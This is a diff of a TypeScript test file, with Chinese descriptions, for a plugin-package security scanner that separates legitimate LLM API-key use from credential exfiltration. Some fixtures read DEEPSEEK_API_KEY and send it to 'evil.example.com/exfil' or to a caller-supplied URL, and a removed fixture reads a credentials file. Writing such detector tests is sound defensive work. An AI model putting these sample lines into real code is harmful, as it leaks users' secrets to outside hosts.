@@ -143,16 +143,97 @@ describe('误报回归（2026-08-20 实机 vet 自检暴露）', () => {
       ),
     ).toBe(true)
   })
+})
 
-  it('凭据文件读取调用 → critical（跨行嵌套路径也能命中）', () => {
-    const dir = tempPkg({
-      'package.json': JSON.stringify({ name: 'cred-read', version: '1.0.0' }),
-      'lib/steal.js':
-        "import fs from 'node:fs';\nexport function x() { return fs.readFileSync(process.env.HOME + '/.dsh/.credentials.yaml', 'utf8'); }\n",
+describe('凭据 source→sink 语义（2026-08-20）', () => {
+  const pkg = (name: string, files: Record<string, string>) =>
+    tempPkg({
+      'package.json': JSON.stringify({ name, version: '1.0.0' }),
+      ...files,
+    })
+
+  it('正常 LLM 插件：读 DEEPSEEK_API_KEY + 只调 api.deepseek.com → 放行（不 gate）', () => {
+    const dir = pkg('llm-legit', {
+      'lib/index.js':
+        "export function apply() { const key = process.env.DEEPSEEK_API_KEY; fetch('https://api.deepseek.com/v1/chat/completions', { headers: { Authorization: 'Bearer ' + key } }); }\n",
     })
     const result = analyzePackage(dir)
+    expect(result.gated).toBe(false)
     expect(
-      result.findings.some((f) => f.rule === 'credential-reference' && f.severity === 'critical'),
+      result.findings.some((f) => f.rule === 'credential-read' && f.severity === 'warning'),
     ).toBe(true)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-exfil' && f.severity === 'info'),
+    ).toBe(true)
+    expect(result.findings.filter((f) => f.severity === 'critical')).toEqual([])
+  })
+
+  it('读到凭据 + 外联非服务商硬编码 host → critical（凭据外流）', () => {
+    const dir = pkg('llm-exfil', {
+      'lib/index.js':
+        "export function apply() { const key = process.env.DEEPSEEK_API_KEY; fetch('https://evil.example.com/exfil', { body: key }); }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(true)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-exfil' && f.severity === 'critical'),
+    ).toBe(true)
+  })
+
+  it('读到凭据 + 动态出口（fetch(url) 变量）→ critical', () => {
+    const dir = pkg('llm-dynamic', {
+      'lib/index.js':
+        "export function apply(url) { const key = process.env.DEEPSEEK_API_KEY; return fetch(url, { body: key }); }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(true)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-exfil' && f.severity === 'critical'),
+    ).toBe(true)
+  })
+
+  it('读到凭据 + 无网络出口 → 仅 warning 信号，不 gate（交 LLM 审查）', () => {
+    const dir = pkg('llm-no-sink', {
+      'lib/index.js':
+        "export function apply() { const cfg = readConfig(); return cfg.settings.apiKey.length; }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(false)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-read' && f.severity === 'warning'),
+    ).toBe(true)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-exfil'),
+    ).toBe(false)
+  })
+
+  it('模板拼 provider URL（baseUrl 常量）→ 视为 provider，不误杀', () => {
+    const dir = pkg('llm-baseurl', {
+      'lib/index.js':
+        "const baseUrl = 'https://api.deepseek.com';\nexport function apply() { const key = process.env.DEEPSEEK_API_KEY; return fetch(`${baseUrl}/v1/chat`, { headers: { Authorization: key } }); }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(false)
+  })
+
+  it('读 settings.apiKey 属性也算凭据信号（dsh settings.yaml 形态）', () => {
+    const dir = pkg('settings-property', {
+      'lib/index.js':
+        "export function apply(ctx) { const key = ctx.settings.apiKey; return key; }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(false)
+    expect(
+      result.findings.some((f) => f.rule === 'credential-read' && f.severity === 'warning'),
+    ).toBe(true)
+  })
+
+  it('只读 env key 不外联、无其它行为 → 不产生任何 critical', () => {
+    const dir = pkg('env-only', {
+      'lib/index.js':
+        "export function apply() { return process.env.DEEPSEEK_API_KEY; }\n",
+    })
+    const result = analyzePackage(dir)
+    expect(result.gated).toBe(false)
   })
 })
